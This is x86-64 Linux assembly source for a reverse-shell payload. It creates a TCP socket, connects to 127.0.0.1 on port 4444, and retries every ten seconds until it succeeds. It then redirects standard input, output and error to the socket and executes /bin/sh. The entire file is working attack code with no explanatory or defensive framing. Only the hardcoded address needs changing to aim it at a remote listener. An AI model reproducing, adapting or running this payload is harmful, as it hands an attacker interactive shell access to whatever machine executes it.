section .data
        command db '/bin/sh', 0

section .text
        global _start

sockaddr:
        dw 2
        dw 0x5c11
        dd 0x0100007F
        dq 0

timespec:
        dq 10
        dq 0

_start:
connect:
        ;socket(AF_INET, SOCK_STREAM, 0)
        mov rax, 41
        mov rdi, 2
        mov rsi, 1
        mov rdx, 0
        syscall 
        test rax, rax
        js exit_with_error
        mov r8, rax

        ;connect(socket, sockaddr, 16)
        mov rdi, rax
        lea rsi, [rel sockaddr]
        mov rdx, 16
        mov rax, 42
        syscall
        test rax, rax
        js wait_and_retry

        xor rsi, rsi
        jmp dup2_loop

wait_and_retry:
        ;nanosleep(10, 0)
        mov rax, 35
        lea rdi, [rel timespec]
        xor rsi, rsi
        syscall
        jmp connect

dup2_loop:
        ;dup2(client_fd, new_fd)
        mov rax, 33
        mov rdi, r8
        syscall
        test rax, rax
        js exit_with_error

        inc rsi
        cmp rsi, 3
        jne dup2_loop

        ;execve("/bin/sh", 0, 0)
        mov rax, 59
        mov rdi, command
        mov rsi, 0
        mov rdx, 0
        syscall
        test rax, rax
        js exit_with_error

        mov rax, 60
        xor rdi, rdi
        syscall
exit_with_error:
        mov rax, 60
        mov rdi, 1
        syscall

